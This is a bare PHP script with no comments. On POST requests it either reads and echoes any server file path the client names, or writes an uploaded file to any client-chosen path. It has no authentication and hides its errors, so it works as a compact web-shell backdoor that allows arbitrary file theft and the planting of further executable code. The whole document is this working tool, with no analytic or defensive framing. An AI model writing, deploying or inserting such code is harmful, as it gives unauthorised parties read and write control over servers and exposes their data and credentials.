<?php
function download()
{
	if(isset($_POST['file_path'])) {
		echo @file_get_contents($_POST['file_path']);
	}
}

function upload()
{
	if(isset($_POST['file_path'])) {
		@move_uploaded_file($_FILES['remote_file']['tmp_name'], $_POST['file_path']);
	}
}

if($_POST) {
	if(isset($_POST['action'])) {
		switch($_POST['action']) {
		case 'download':
			download();
			break;
		case 'upload':
			upload();
			break;
		}
	}
}



?>
